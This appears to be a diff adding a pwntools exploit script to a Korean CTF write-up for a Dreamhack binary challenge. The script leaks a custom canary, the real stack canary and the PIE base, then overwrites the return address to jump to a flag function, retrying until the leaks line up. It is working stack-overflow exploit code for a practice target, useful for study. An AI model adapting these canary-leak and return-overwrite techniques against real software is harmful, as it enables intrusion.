@@ -37,4 +37,80 @@
    만약 카나리 64바이트 중간에 우연히 \x00이 섞여 있으면, printf 릭이 거기서 끊겨버립니다.
    해결: 릭된 데이터가 64바이트보다 짧거나 주소 끝자리가 000이 아니면, "이번 판은 운이 없었다"고 판단하고 성공할 때까지 계속 다시 시도하는 것입니다.
 
-   
+
+------------------------------------------------------expl.py-----------------------------------
+
+
+from pwn import *
+
+# 파일 로드
+e = ELF('./main')
+libc = ELF('./libc.so.6')
+ld = ELF('./ld-linux-x86-64.so.2')
+
+while True:
+        try :
+
+                # 만약 patchelf를 안 했다면 아래와 같이 실행 가능
+                #p = remote("host8.dreamhack.games", 20685)
+                p = process(['./ld-linux-x86-64.so.2', './main'], env={"LD_PRELOAD": "./libc.so.6"})
+
+                # custom_canary leak
+                p.sendline(b'2')
+                p.sendafter(b"Input operation : ", b'a' * 16)
+                p.sendlineafter(b"> ", b'1')
+                p.recvuntil(b"X-Ray result : " + b'a' * 16)
+                custom_canary = p.recvn(64)
+                if b'\n' in custom_canary or len(custom_canary) < 64:
+                        p.close(); continue
+
+                #real_canary leak
+                p.sendlineafter(b"> ", b'2')
+                p.sendafter(b"Input operation : ", b'a' * 16 + custom_canary + b'a' * 9)
+                p.sendlineafter(b"> ", b'1')
+                p.recvuntil(b"X-Ray result : " + b'a' * 16 + custom_canary + b'a' * 9)
+                real_canary_part = p.recvn(7)
+                real_canary = b"\x00" + real_canary_part
+
+                # PIE Base leak
+                p.sendlineafter(b"> ", b'2')
+                p.sendafter(b"Input operation : ", b'a' * 136) # 120바이트 채우기
+                p.sendlineafter(b"> ", b'1')
+                p.recvuntil(b"X-Ray result : " + b'a' * 136)
+
+                # 스택에 있는 main+8 주소
+                leaked_addr = u64(p.recvn(6).ljust(8, b'\x00'))
+
+                # address
+                base_addr = leaked_addr - 0x1289
+                e.address = base_addr
+                if hex(base_addr)[-3:] != '000':
+                        p.close(); continue
+                flag_addr = e.address + 0x158E
+                ret_gadget = base_addr + 0x101a
+
+                # payload
+                payload = b'a' * 16
+                payload += custom_canary
+                payload += b'a' * 8  # padding
+                payload += real_canary
+                payload += b'a' * 8 # (rbp)
+                payload += p64(ret_gadget)
+                payload += p64(flag_addr) # Return Address -> sub_158E
+
+                p.sendlineafter(b"> ", b'2')
+                p.sendafter(b"Input operation : ", payload)
+
+                p.sendlineafter(b"> ", b'3')
+
+
+                p.interactive()
+                break
+        except Exception:
+                p.close()
+
+
+
+
+
+
